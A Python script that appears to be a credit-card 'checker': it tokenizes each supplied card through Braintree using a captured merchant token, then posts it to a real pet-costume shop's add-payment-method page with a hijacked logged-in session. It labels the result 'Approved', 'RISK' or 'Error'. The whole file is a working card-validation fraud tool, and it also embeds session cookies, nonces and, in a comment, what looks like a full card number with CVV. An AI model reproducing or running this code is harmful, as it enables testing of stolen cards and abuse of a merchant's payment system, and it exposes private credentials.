def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()




























	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0MjcxMTYsImp0aSI6IjNmNDliMmYxLWU3ZjQtNGM2MC05OTNhLTljNjIzZDFiNzY4ZSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kY_nvNlhSi37F6ULMd7PegDKW1sVg4m7WU99RLZ-pcqEm2aAHmkctCAJvXtSWs5nnkSS-EpBhO_EivLCFR3dFQ',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '51dd0e38-30ce-4ccf-9c55-5192bb8ba04e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"51dd0e38-30ce-4ccf-9c55-5192bb8ba04e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4659017718276017","expirationMonth":"08","expirationYear":"2027","cvv":"351"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

#2




	cookies = {
    '_ga': 'GA1.1.1237750036.1729259464',
    '_fbp': 'fb.1.1729259465569.74668477555339401',
    'mc_landing_site': 'https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F',
    'wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9': 'lyy446333%7C1729864385%7CHlWB5OTHRQo8DDTNp2XNM3rIhbGroPSNCPgRhOoiU6N%7Cf9071c64db2db2dc86b93cf717a674e19651aa00f89ca2658c2dba2bab266fd9',
    'wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9': '2881%7C%7C1729432253%7C%7C1729428653%7C%7C9511f2552ec49d976c240b2dba007972',
    '_gcl_au': '1.1.1302227665.1729259464.968699663.1729259521.1729259711',
    '_ga_128CPY397L': 'GS1.1.1729259464.1.1.1729259863.0.0.0',
    'mcfw-wp-user-cookie': 'Mjg4MXwwfDYzfDQwMDMxXzhiMWQ5MTczYTViMTU4YTM4YjZkNzA2NmI2ZmM0NzAyNzc4MjkyN2NmYzdiNjM5M2M3MTQzZjI5OTExNzk1MTg%3D',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F',
    'sbjs_first_add': 'fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '065c33208d5811efb16bb958e6e5087e',
    '_uetvid': '065de7d08d5811ef90035566a420a3c4',
}

	headers = {
    'authority': 'petcostumecenter.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1237750036.1729259464; _fbp=fb.1.1729259465569.74668477555339401; mc_landing_site=https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F; wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9=lyy446333%7C1729864385%7CHlWB5OTHRQo8DDTNp2XNM3rIhbGroPSNCPgRhOoiU6N%7Cf9071c64db2db2dc86b93cf717a674e19651aa00f89ca2658c2dba2bab266fd9; wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9=2881%7C%7C1729432253%7C%7C1729428653%7C%7C9511f2552ec49d976c240b2dba007972; _gcl_au=1.1.1302227665.1729259464.968699663.1729259521.1729259711; _ga_128CPY397L=GS1.1.1729259464.1.1.1729259863.0.0.0; mcfw-wp-user-cookie=Mjg4MXwwfDYzfDQwMDMxXzhiMWQ5MTczYTViMTU4YTM4YjZkNzA2NmI2ZmM0NzAyNzc4MjkyN2NmYzdiNjM5M2M3MTQzZjI5OTExNzk1MTg%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=065c33208d5811efb16bb958e6e5087e; _uetvid=065de7d08d5811ef90035566a420a3c4',
    'origin': 'https://petcostumecenter.com',
    'pragma': 'no-cache',
    'referer': 'https://petcostumecenter.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"09fbb8e274fa7303c1729b96e34cf482","fraud_merchant_id":null,"correlation_id":"3d3c2099-b301-468b-9901-87c43fb3"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/t7hv62gg2zr28p8y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/t7hv62gg2zr28p8y"},"merchantId":"t7hv62gg2zr28p8y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"PET COSTUME CENTER","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0MjcxMjUsImp0aSI6IjZmNTE1MWRmLTNhOTQtNDc5Ny1hMmJlLTJhMTcyYTM5YjNhYSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.dpFDlqIgDp6Csv2wY391jP4K3aVz4CJUOjvsipyOAUOKMtcBbkDqOD2LoYHwAzy9aU6QYv-qNcHZNBAVPOay6g","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":false}',
    'woocommerce-add-payment-method-nonce': '1db1836a0b',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://petcostumecenter.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
	
